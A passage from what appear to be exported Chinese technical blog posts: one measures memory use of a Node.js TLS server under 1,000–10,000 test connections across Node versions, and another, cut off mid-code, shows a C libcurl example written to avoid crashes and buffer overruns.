style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(<span style=\"color: #66cccc;\">'tls server listening on port('</span> + port + <span style=\"color: #66cccc;\">')'</span>);\n});\ntlsServer.maxConnections = 10000;\ntlsServer.on(<span style=\"color: #66cccc;\">'clientError'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">exception</span>, <span style=\"color: #ffcc66;\">socket</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.warn(<span style=\"color: #66cccc;\">'tls client('</span> + socket.remoteAddress + <span style=\"color: #66cccc;\">':'</span> + socket.remotePort <span style=\"text-decoration: underline;\">+</span><span style=\"color: #66cccc; text-decoration: underline;\">') error('</span><span style=\"text-decoration: underline;\"> + exception + </span><span style=\"color: #66cccc; text-decoration: underline;\">')'</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   socket.destroy();\n});\n\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">memoryUsage</span>() {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">mem</span> = process.memoryUsage();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">format</span> = <span style=\"color: #99cc99;\">function</span>(<span style=\"color: #ffcc66;\">bytes</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> (bytes/1024/1024).toFixed(2)+<span style=\"color: #66cccc;\">'MB'</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   };\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(<span style=\"color: #66cccc;\">'Process: heapTotal '</span>+format(mem.heapTotal) + <span style=\"color: #66cccc;\">' heapUsed '</span> + for<span style=\"text-decoration: underline;\">mat(mem.heapUsed) + </span><span style=\"color: #66cccc; text-decoration: underline;\">' rss '</span><span style=\"text-decoration: underline;\"> + format(mem.rss));</span>\n}\n\nsetInterval(<span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   tlsServer.getConnections(<span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">err</span>, <span style=\"color: #ffcc66;\">tlsCount</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.error(<span style=\"color: #66cccc;\">\"get tls connections count error(\"</span> + err.toString() + <span style=\"color: #66cccc; text-decoration: underline;\">\")\"</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.warn(<span style=\"color: #66cccc;\">\"server: tls connections(\"</span> + tlsCount + <span style=\"color: #66cccc;\">\")\"</span>);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   memoryUsage();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n}, 1*1000);\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">tls客户端</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">tls</span> = require(<span style=\"color: #66cccc;\">'tls'</span>);\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">tlsCount</span> = 0;\n\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">connect</span>() {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">socket</span> = tls.connect(1234, {rejectUnauthorized: <span style=\"color: #6699cc;\">false</span>}, <span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   tlsCount += 1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   socket.setEncoding(<span style=\"color: #66cccc;\">'utf8'</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   socket.on(<span style=\"color: #66cccc;\">'data'</span>, <span style=\"color: #99cc99;\">function</span>(<span style=\"color: #ffcc66;\">data</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   socket.on(<span style=\"color: #66cccc;\">'close'</span>, <span style=\"color: #99cc99;\">function</span>() {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   tlsCount -= 1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n}\n\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">memoryUsage</span>() {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">mem</span> = process.memoryUsage();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">format</span> = <span style=\"color: #99cc99;\">function</span>(<span style=\"color: #ffcc66;\">bytes</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> (bytes/1024/1024).toFixed(2)+<span style=\"color: #66cccc;\">'MB'</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   };\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(<span style=\"color: #66cccc;\">'Process: heapTotal '</span>+format(mem.heapTotal) + <span style=\"color: #66cccc;\">' heapUsed '</span> + for<span style=\"text-decoration: underline;\">mat(mem.heapUsed) + </span><span style=\"color: #66cccc; text-decoration: underline;\">' rss '</span><span style=\"text-decoration: underline;\"> + format(mem.rss));</span>\n}\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">round</span> = 0;\nsetInterval(<span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (round &lt; 10) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">for</span>(<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">i</span> = 0; i &lt; 100; ++i) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   connect();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   round += 1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.warn(<span style=\"color: #66cccc;\">\"client: tls connections(\"</span> + tlsCount + <span style=\"color: #66cccc;\">\")\"</span>);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   memoryUsage();\n}, 1000);\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">tls服务器日志</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n连接从 <code>0</code> 到 <code>1000</code> 内存增长\n</p>\n\n<pre class=\"example\">\nserver: tls connections(0)\nProcess: heapTotal 9.14MB heapUsed 4.80MB rss 23.69MB\nserver: tls connections(100)\nProcess: heapTotal 10.13MB heapUsed 5.59MB rss 29.53MB\nserver: tls connections(200)\nProcess: heapTotal 10.13MB heapUsed 6.75MB rss 32.32MB\nserver: tls connections(300)\nProcess: heapTotal 9.18MB heapUsed 7.32MB rss 34.37MB\nserver: tls connections(400)\nProcess: heapTotal 10.16MB heapUsed 8.11MB rss 37.05MB\nserver: tls connections(500)\nProcess: heapTotal 11.14MB heapUsed 8.66MB rss 38.18MB\nserver: tls connections(600)\nProcess: heapTotal 11.14MB heapUsed 9.48MB rss 39.73MB\nserver: tls connections(600)\nProcess: heapTotal 12.12MB heapUsed 9.62MB rss 40.50MB\nserver: tls connections(700)\nProcess: heapTotal 15.04MB heapUsed 10.16MB rss 42.69MB\nserver: tls connections(800)\nProcess: heapTotal 18.97MB heapUsed 10.72MB rss 44.50MB\nserver: tls connections(900)\nProcess: heapTotal 18.97MB heapUsed 11.68MB rss 46.30MB\nserver: tls connections(1000)\nProcess: heapTotal 18.97MB heapUsed 12.63MB rss 47.32MB\n</pre>\n\n<p>\ntls客户端结束后连接数从 <code>1000</code> 降到 <code>0</code> 约 <code>30</code> 秒后\n</p>\n\n<pre class=\"example\">\nserver: tls connections(0)\nProcess: heapTotal 22.91MB heapUsed 13.63MB rss 48.44MB\n</pre>\n\n<p>\n从上面的日志可以计算出：\n</p>\n\n<ul class=\"org-ul\">\n<li>每 <code>tls</code> 连接 <code>rss</code> 要消耗 <code>24.2KB</code>  <code>heap</code> 要消耗 <code>8KB</code>\n</li>\n\n<li>连接关闭后内存没有释放\n\n<p>\n还略有增加，要么就是 <code>node.js</code> 没有释放 <code>tls</code> 连接的内存（应该不太可能），要么就是我的代码有问题，没有释放资源\n</p>\n</li>\n</ul>\n\n<p>\n使用 <code>heapdump</code> 导出堆数据后通过 <code>Chromium</code> 的开发工具进行分析，发现事情没这么简单，占用的内存绝大部分是代码，\n<code>tls</code> 服务器不退出，使用 <code>tls</code> 客户端测试多轮后可以发现 <code>rss</code> 内存占用不会增加， <code>tls</code> 客户端退出关闭所有连接后，\n<code>rss</code> 内存占用总是会恢复到同一水平，这就说明代码是没有问题的，应该不存在内存泄露。\n</p>\n\n<p>\n多轮测试后重新取样：\n</p>\n\n<pre class=\"example\">\nserver: tls connections(0)\nProcess: heapTotal 21.93MB heapUsed 13.22MB rss 54.06MB\nserver: tls connections(100)\nProcess: heapTotal 21.93MB heapUsed 14.16MB rss 54.06MB\nserver: tls connections(200)\nProcess: heapTotal 25.86MB heapUsed 14.79MB rss 58.57MB\nserver: tls connections(300)\nProcess: heapTotal 25.86MB heapUsed 15.76MB rss 59.08MB\nserver: tls connections(400)\nProcess: heapTotal 25.86MB heapUsed 16.69MB rss 59.08MB\nserver: tls connections(500)\nProcess: heapTotal 27.83MB heapUsed 16.72MB rss 60.37MB\nserver: tls connections(600)\nProcess: heapTotal 27.83MB heapUsed 17.65MB rss 60.37MB\nserver: tls connections(700)\nProcess: heapTotal 33.74MB heapUsed 15.76MB rss 59.32MB\nserver: tls connections(800)\nProcess: heapTotal 33.74MB heapUsed 16.71MB rss 59.32MB\nserver: tls connections(800)\nProcess: heapTotal 33.74MB heapUsed 16.83MB rss 59.32MB\nserver: tls connections(900)\nProcess: heapTotal 33.74MB heapUsed 18.31MB rss 59.38MB\nserver: tls connections(1000)\nProcess: heapTotal 33.74MB heapUsed 19.24MB rss 59.38MB\n</pre>\n\n<p>\n从上面的日志可以计算出：\n</p>\n\n<ul class=\"org-ul\">\n<li>每 <code>tls</code> 连接 <code>rss</code> 要消耗 <code>5.45KB</code> ， <code>heap</code> 要消耗 <code>6.16KB</code>\n</li>\n</ul>\n\n<p>\n也就是说正常情况下， <code>3000</code> 个 <code>tls</code> 连接， <code>rss</code> 会消耗 <code>16MB</code> ， <code>heap</code> 会消耗 <code>18MB</code> ，占用 <code>1G</code> 的问题肯定出在其它地方。\n</p>\n\n<p>\n另外注意到调用 <code>heapdump.writeSnapshot</code> 后内存占用大幅下降，应该是 <code>heapdump</code> 触发了 <code>v8</code> 的垃圾回收， <code>v8</code> 的垃圾回收应该不是实时精确的，要精确测量内存占用，估计也要像 <code>heapdump</code> 一样让 <code>v8</code> 将全部垃圾回收后再测量。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">不同版本的node.js结果会有差异</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n为了完全模拟真实环境，针对每一个接收的 <code>tls</code> 连接，除了 <code>close</code> ，还监听了 <code>data</code> 、 <code>error</code> 、 <code>timeout</code> 事件：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">socket.on(<span style=\"color: #66cccc;\">\"data\"</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">data</span>) {\n\n});\nsocket.on(<span style=\"color: #66cccc;\">\"error\"</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">err</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.warn(<span style=\"color: #66cccc;\">'tls client('</span> + socket.remoteAddress + <span style=\"color: #66cccc;\">':'</span> + socket.remotePort <span style=\"text-decoration: underline;\">+</span><span style=\"color: #66cccc; text-decoration: underline;\">') error('</span><span style=\"text-decoration: underline;\"> + err.toString() + </span><span style=\"color: #66cccc; text-decoration: underline;\">')'</span><span style=\"text-decoration: underline;\">);</span>\n});\nsocket.on(<span style=\"color: #66cccc;\">\"close\"</span>, <span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.warn(<span style=\"color: #66cccc;\">'tls client('</span> + socket.remoteAddress + <span style=\"color: #66cccc;\">':'</span> + socket.remotePort <span style=\"text-decoration: underline;\">+</span><span style=\"color: #66cccc; text-decoration: underline;\">') closed'</span><span style=\"text-decoration: underline;\">);</span>\n});\nsocket.on(<span style=\"color: #66cccc;\">\"timeout\"</span>, <span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   socket.destroy();\n});\n</pre>\n</div>\n\n<p>\n前面的测试我使用的是 <code>node-v5.3.0</code> ，我使用 <code>node-v0.12.7</code> 重新测了几轮，最终 <code>rss</code> 内存占用停在 <code>145.5MB</code> ，这还只是 <code>1000</code> 个 <code>tls</code> 连接，使用 <code>3000</code> 个 <code>tls</code> 连接进行测试， <code>rss</code> 内存占用停在 <code>303MB</code> 。再次使用 <code>node-v5.3.0</code> 测试 <code>3000</code> 个 <code>tls</code> 连接， <code>rss</code> 内存占用停在 <code>115MB - 130MB</code> 之间，随着连接的增减有一定的波动。\n</p>\n\n<p>\n由此看来 <code>tls</code> 连接是要占用一定内存量的，高版本的 <code>node</code> 改进很大，可以考虑升级一下 <code>node</code> 。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">最后附上 node.js 各个版本的测试结果</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<table border=\"2\" cellspacing=\"0\" cellpadding=\"6\" rules=\"groups\" frame=\"hsides\">\n<caption class=\"t-above\"><span class=\"table-number\">Table 1:</span> 10000 tls connections</caption>\n\n<colgroup>\n<col  class=\"left\" />\n\n<col  class=\"right\" />\n\n<col  class=\"right\" />\n\n<col  class=\"right\" />\n</colgroup>\n<thead>\n<tr>\n<th scope=\"col\" class=\"left\">node.js</th>\n<th scope=\"col\" class=\"right\">heapTotal(MB)</th>\n<th scope=\"col\" class=\"right\">heapUsed(MB)</th>\n<th scope=\"col\" class=\"right\">rss(MB)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class=\"left\">node-v0.12.7</td>\n<td class=\"right\">158.34</td>\n<td class=\"right\">98.62</td>\n<td class=\"right\">728.26</td>\n</tr>\n\n<tr>\n<td class=\"left\">node-v0.12.9</td>\n<td class=\"right\">239.04</td>\n<td class=\"right\">209.53</td>\n<td class=\"right\">838.40</td>\n</tr>\n\n<tr>\n<td class=\"left\">node-v4.2.3</td>\n<td class=\"right\">86.58</td>\n<td class=\"right\">81.47</td>\n<td class=\"right\">222.97</td>\n</tr>\n\n<tr>\n<td class=\"left\">node-v5.3.0</td>\n<td class=\"right\">96.73</td>\n<td class=\"right\">75.23</td>\n<td class=\"right\">235.11</td>\n</tr>\n</tbody>\n</table>\n\n<ul class=\"org-ul\">\n<li>测试脚本\n\n<p>\n<a href=\"../static/test_tls_server.js\">test_tls_server.js</a>\n</p>\n\n<p>\n<a href=\"../static/test_tls_client.js\">test_tls_client.js</a>\n</p>\n</li>\n\n<li>测试命令\n\n<p>\n终端 <code>1</code> ( <code>tls</code> 服务器)\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo bash -c <span style=\"color: #66cccc;\">\"(ulimit -n 10240; node ./test_tls_server.js)\"</span>\n</pre>\n</div>\n\n<p>\n终端 <code>2</code> ( <code>tls</code> 客户端)\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo bash -c <span style=\"color: #66cccc;\">\"(ulimit -n 10240; for (( i = 0; i &lt; 100; i++)); do echo round \\$i;</span><span style=\"color: #66cccc; text-decoration: underline;\"> node ./test_tls_client.js; done;)\"</span>\n</pre>\n</div>\n\n<p>\n内存占用取的是 <code>tls</code> 测试客户端退出后，服务器端最后建立了 <code>10000</code> 个 <code>tls</code> 连接时的内存占用。</p>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "安全使用libcurl的正确姿势",
  "timestamp": "2015-12-21 18:14:00",
  "tags": [
    "c"
  ],
  "body": "<p>\n在我们的项目中，数次遇到 <code>libcurl</code> 导致的应用程序崩溃问题，这里总结了一下使用 <code>libcurl</code> 的正确姿势。\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span class=\"linenr\"> 1: </span><span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;curl/curl.h&gt;</span>\n<span class=\"linenr\"> 2: </span><span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;stdint.h&gt;</span>\n<span class=\"linenr\"> 3: </span><span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;string.h&gt;</span>\n<span class=\"linenr\"> 4: </span>\n<span class=\"linenr\"> 5: </span>\n<span class=\"linenr\"> 6: </span><span style=\"color: #cc99cc;\">#define</span> <span style=\"color: #ffcc66;\">RESPONSE_BODY_SIZE</span> 128\n<span class=\"linenr\"> 7: </span>\n<span class=\"linenr\"> 8: </span><span style=\"color: #99cc99;\">static</span> <span style=\"color: #6699cc;\">size_t</span> <span style=\"color: #f99157;\">write_function</span>(<span style=\"color: #99cc99;\">const</span> <span style=\"color: #6699cc;\">void</span> *<span style=\"color: #ffcc66;\">buffer</span>, <span style=\"color: #99cc99;\">const</span> <span style=\"color: #6699cc;\">size_t</span> <span style=\"color: #ffcc66;\">size</span>, <span style=\"color: #99cc99;\">const</span> <span style=\"color: #6699cc;\">size_t</span><span style=\"text-decoration: underline;\"> </span><span style=\"color: #ffcc66; text-decoration: underline;\">nmemb</span><span style=\"text-decoration: underline;\">, </span><span style=\"color: #6699cc; text-decoration: underline;\">void</span><span style=\"text-decoration: underline;\"> *</span><span style=\"color: #ffcc66; text-decoration: underline;\">user_p</span><span style=\"text-decoration: underline;\">)</span>\n<span class=\"linenr\"> 9: </span>{\n<span class=\"linenr\">10: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">char</span>* <span style=\"color: #ffcc66;\">response_body</span> = (<span style=\"color: #6699cc;\">char</span>*)user_p;\n<span class=\"linenr\">11: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">uint32_t</span> <span style=\"color: #ffcc66;\">response_body_len</span> = strlen(response_body);\n<span class=\"linenr\">12: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">uint32_t</span> <span style=\"color: #ffcc66;\">len</span> = size*nmemb;\n<span class=\"linenr\">13: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (len &gt; RESPONSE_BODY_SIZE - response_body_len - 1) {\n<span class=\"linenr\">14: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   len = RESPONSE_BODY_SIZE - response_body_len - 1;\n<span class=\"linenr\">15: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span id=\"coderef-curl_write_function_buffer\" class=\"coderef-off\"><span class=\"linenr\">16: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   memcpy(response_body + response_body_len, buffer, len);</span>\n<span id=\"coderef-curl_write_function_return\" class=\"coderef-off\"><span class=\"linenr\">17: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> size*nmemb;</span>\n<span class=\"linenr\">18: </span>}\n<span class=\"linenr\">19: </span>\n<span class=\"linenr\">20: </span><span style=\"color: #6699cc;\">int</span> <span style=\"color: #f99157;\">main</span>(<span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">argc</span>, <span style=\"color: #6699cc;\">char</span> *<span style=\"color: #ffcc66;\">argv</span>[])\n<span class=\"linenr\">21: </span>{\n<span class=\"linenr\">22: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">const</span> <span style=\"color: #6699cc;\">char</span>* <span style=\"color: #ffcc66;\">url</span> = <span style=\"color: #66cccc;\">\"http://www.example.com/dns_servers\"</span>;\n<span class=\"linenr\">23: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">struct</span> <span style=\"color: #6699cc;\">curl_slist</span> *<span style=\"color: #ffcc66;\">headers</span> = <span style=\"color: #6699cc;\">NULL</span>;\n<span class=\"linenr\">24: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   headers = curl_slist_append(headers, <span style=\"color: #66cccc;\">\"Content-Type: application/json\"</span>);\n<span class=\"linenr\">25: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">const</span> <span style=\"color: #6699cc;\">char</span>* <span style=\"color: #ffcc66;\">request_body</span> = <span style=\"color: #66cccc;\">\"{\\\"host\\\": \\\"8.8.8.8\\\", \\\"port\\\": 53}\"</span>;\n<span class=\"linenr\">26: </span>\n<span class=\"linenr\">27: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">CURL</span> *<span style=\"color: #ffcc66;\">curl</span>;\n<span class=\"linenr\">28: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">CURLcode</span> <span style=\"color: #ffcc66;\">res</span>;\n<span class=\"linenr\">29: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">char</span> <span style=\"color: #ffcc66;\">response_body</span>[RESPONSE_BODY_SIZE] = {<span style=\"color: #66cccc;\">'\\0'</span>};\n<span class=\"linenr\">30: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">long</span> <span style=\"color: #ffcc66;\">response_code</span> = 0;\n<span class=\"linenr\">31: </span>\n<span class=\"linenr\">32: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   curl = curl_easy_init();\n<span class=\"linenr\">33: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(curl) {\n<span class=\"linenr\">34: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   curl_easy_setopt(curl, CURLOPT_URL, url);\n<span class=\"linenr\">35: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);\n<span class=\"linenr\">36: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   curl_easy_setopt(curl, CURLOPT_POSTFIELDS, request_body);\n<span class=\"linenr\">37: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(request_body));\n<span id=\"coderef-curl_nosignal\" class=\"coderef-off\"><span class=\"linenr\">38: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);</span>\n<span class=\"linenr\">39: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);\n<span class=\"linenr\">40: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_function);\n<span class=\"linenr\">41: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   curl_easy_setopt(curl, CURLOPT_WRITEDATA, response_body);\n<span class=\"linenr\">42: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   res = curl_easy_perform(curl);\n<span class=\"linenr\">43: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (res == CURLE_OK) {\n<span id=\"coderef-curl_response_code\" class=\"coderef-off\"><span class=\"linenr\">44: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   res = curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &amp;response_code<span style=\"text-decoration: underline;\">);</span></span>\n<span class=\"linenr\">45: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span class=\"linenr\">46: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(res != CURLE_OK) {\n<span class=\"linenr\">47: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"request to %s error(%d): %s\"</span>, url, res, curl_easy_s<span style=\"text-decoration: underline;\">trerror(res));</span>\n<span class=\"linenr\">48: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span class=\"linenr\">49: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   curl_easy_cleanup(curl);\n<span class=\"linenr\">50: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span class=\"linenr\">51: </span>\n<span class=\"linenr\">52: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   curl_slist_free_all(headers);\n<span class=\"linenr\">53: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (response_code == 201) {\n<span class=\"linenr\">54: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"request to %s successful: %s\\n\"</span>, url, response_body);\n<span class=\"linenr\">55: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> 0;\n<span class=\"linenr\">56: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span class=\"linenr\">57: </span>\n<span class=\"linenr\">58: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"request to %s response failed(%ld): %s\\n\"</span>, url, response_co<span style=\"text-decoration: underline;\">de, response_body);</span>\n<span class=\"linenr\">59: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> 